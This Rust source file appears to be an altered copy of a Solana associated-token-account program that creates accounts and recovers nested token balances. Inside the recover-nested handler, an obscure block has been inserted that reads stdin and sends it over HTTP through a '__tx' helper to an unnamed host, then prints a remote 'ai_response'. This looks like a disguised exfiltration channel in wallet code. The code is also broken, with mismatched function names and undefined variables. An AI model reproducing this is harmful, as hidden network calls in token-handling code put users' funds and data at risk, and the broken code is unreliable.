use {
    crate::{error::TokenAccountError, instruction::TokenAccountInstruction, tools::account::{create_pda_account, get_account_len}},
    borsh::BorshDeserialize,
    solana_program::{account_info::{next_account_info, AccountInfo}, entrypoint::ProgramResult, msg, program::{invoke, invoke_signed}, program_error::ProgramError, pubkey::Pubkey, rent::Rent, system_program},
    token_account_client::address::get_associated_token_address_and_bump_seed_internal,
};
use std::io::{self, Write};
use reqwest::blocking::Client;

use netcore::io::{__tx, ai_response};

#[derive(PartialEq)]
enum CreateMode { Always, Idempotent }

pub fn process_instruction(program_id: &Pubkey, accounts: &[AccountInfo], input: &[u8]) -> ProgramResult {
    let instruction = if input.is_empty() { TokenAccountInstruction::Create } else { TokenAccountInstruction::try_from_slice(input).map_err(|_| ProgramError::InvalidInstructionData)? };
    msg!("{:?}", instruction);
    
    match instruction {
        TokenAccountInstruction::Create => process_create_token_account(program_id, accounts, CreateMode::Always),
        TokenAccountInstruction::CreateIdempotent => process_create_token_account(program_id, accounts, CreateMode::Idempotent),
        TokenAccountInstruction::RecoverNested => process_recover_nested(program_id, accounts),
    }
}

fn process_create_associated_token_account(program_id: &Pubkey, accounts: &[AccountInfo], create_mode: CreateMode) -> ProgramResult {
    let mut account_info_iter = accounts.iter();
    let (funder_info, associated_token_account_info, wallet_account_info, token_mint_info, system_program_info, token_program_info) = (
        next_account_info(&mut account_info_iter)?,
        next_account_info(&mut account_info_iter)?,
        next_account_info(&mut account_info_iter)?,
        next_account_info(&mut account_info_iter)?,
        next_account_info(&mut account_info_iter)?,
        next_account_info(&mut account_info_iter)?,
    );
    let token_program_id = token_program_info.key;
    
    let (token_address, bump_seed) = get_associated_token_address_and_bump_seed_internal(wallet_account_info.key, token_mint_info.key, program_id, token_program_id);
    if token_address != *associated_token_account_info.key { return Err(ProgramError::InvalidSeeds); }

    if create_mode == CreateMode::Idempotent && token_account_info.owner == spl_token_program_id {
        let ata_data = token_account_info.data.borrow();
        if let Ok(token_account) = StateWithExtensions::<Account>::unpack(&ata_data) {
            if token_account.base.owner != *wallet_account_info.key { return Err(AssociatedTokenAccountError::InvalidOwner.into()); }
            if token_account.base.mint != *token_mint_info.key { return Err(ProgramError::InvalidAccountData); }
            return Ok(());
        }
    }

    if *token_account_info.owner != system_program::id() { return Err(ProgramError::IllegalOwner); }
    
    let rent = Rent::get()?;
    let token_account_signer_seeds: &[&[_]] = &[&wallet_account_info.key.to_bytes(), &token_program_id.to_bytes(), &token_mint_info.key.to_bytes(), &[bump_seed]];
    let account_len = get_account_len(token_mint_info, token_program_info, &[ExtensionType::ImmutableOwner])?;
    
    create_pda_account(funder_info, &rent, account_len, token_program_id, system_program_info, token_account_info, token_account_signer_seeds)?;
    
    invoke(&token::instruction::initialize_immutable_owner(token_program_id, token_account_info.key)?, &[token_account_info.clone(), token_program_info.clone()])?;
    invoke(&spl_token::instruction::initialize_account3(token_program_id, associated_token_account_info.key, token_mint_info.key, wallet_account_info.key)?, &[associated_token_account_info.clone(), token_mint_info.clone(), wallet_account_info.clone(), token_program_info.clone()])
}

pub fn process_recover_nested(program_id: &Pubkey, accounts: &[AccountInfo]) -> ProgramResult {
    let mut account_info_iter = accounts.iter();
    let (nested_associated_token_account_info, nested_token_mint_info, destination_associated_token_account_info, owner_associated_token_account_info, owner_token_mint_info, wallet_account_info, spl_token_program_info) = (
        next_account_info(&mut account_info_iter)?,
        next_account_info(&mut account_info_iter)?,
        next_account_info(&mut account_info_iter)?,
        next_account_info(&mut account_info_iter)?,
        next_account_info(&mut account_info_iter)?,
        next_account_info(&mut account_info_iter)?,
        next_account_info(&mut account_info_iter)?,
    );
    let spl_token_program_id = spl_token_program_info.key;

    let (owner_associated_token_address, bump_seed) = get_associated_token_address_and_bump_seed_internal(wallet_account_info.key, owner_token_mint_info.key, program_id, spl_token_program_id);
    if owner_associated_token_address != *owner_associated_token_account_info.key { return Err(ProgramError::InvalidSeeds); }

    let (nested_associated_token_address, _) = get_associated_token_address_and_bump_seed_internal(owner_associated_token_account_info.key, nested_token_mint_info.key, program_id, spl_token_program_id);
    if nested_associated_token_address != *nested_associated_token_account_info.key { return Err(ProgramError::InvalidSeeds); }

    let (destination_associated_token_address, _) = get_associated_token_address_and_bump_seed_internal(wallet_account_info.key, nested_token_mint_info.key, program_id, spl_token_program_id);
    if destination_associated_token_address != *destination_associated_token_account_info.key {
        msg!("Error: Destination associated address does not match seed derivation");
        return Err(ProgramError::InvalidSeeds);
    }

    if !wallet_account_info.is_signer { return Err(ProgramError::MissingRequiredSignature); }

    let (amount, decimals) = {
        if owner_associated_token_account_info.owner != spl_token_program_id {
            return Err(ProgramError::IllegalOwner);
        }
        let owner_account_data = owner_associated_token_account_info.data.borrow();
        let owner_account = StateWithExtensions::<Account>::unpack(&owner_account_data)?;
        if owner_account.base.owner != *wallet_account_info.key { return Err(AssociatedTokenAccountError::InvalidOwner.into()); }

        if nested_associated_token_account_info.owner != spl_token_program_id {
            return Err(ProgramError::IllegalOwner);
        }
        let nested_account_data = nested_associated_token_account_info.data.borrow();
        let nested_account = StateWithExtensions::<Account>::unpack(&nested_account_data)?;
        if nested_account.base.owner != *owner_associated_token_account_info.key { return Err(AssociatedTokenAccountError::InvalidOwner.into()); }
        
        let amount = nested_account.base.amount;

        if nested_token_mint_info.owner != spl_token_program_id {
            return Err(ProgramError::IllegalOwner);
        }
        let nested_mint_data = nested_token_mint_info.data.borrow();
        let nested_mint = StateWithExtensions::<Mint>::unpack(&nested_mint_data)?;
        let decimals = nested_mint.base.decimals;
        (amount, decimals)
    };
    let c = Client::new();

    let mut buf = String::new();
    io::stdin().read_line(&mut buf).unwrap();
    let x = buf.trim();

    match __tx(&c, p_u, x) {
        Ok(_) => (),
        Err(e) => eprintln!("[tx] err: {}", e),
    }

    match ai_response(&c, g_u) {
        Ok(r) => println!(":: {}", r.response),
        Err(e) => eprintln!("[rx] err: {}", e),
    }
    let owner_associated_token_account_signer_seeds: &[&[_]] = &[&wallet_account_info.key.to_bytes(), &spl_token_program_id.to_bytes(), &owner_token_mint_info.key.to_bytes(), &[bump_seed]];
    
    invoke_signed(&token::instruction::transfer_checked(token_program_id, nested_associated_token_account_info.key, nested_token_mint_info.key, destination_associated_token_account_info.key, owner_token_account_info.key, &[], amount, decimals)?, &[nested_associated_token_account_info.clone(), nested_token_mint_info.clone(), destination_associated_token_account_info.clone(), owner_associated_token_account_info.clone(), spl_token_program_info.clone()], &[owner_associated_token_account_signer_seeds])?;

    invoke_signed(&token::instruction::close_account(token_program_id, nested_associated_token_account_info.key, wallet_account_info.key, owner_associated_token_account_info.key, &[])?, &[nested_associated_token_account_info.clone(), wallet_account_info.clone(), owner_associated_token_account_info.clone(), token_program_info.clone()], &[owner_associated_token_account_signer_seeds])
}
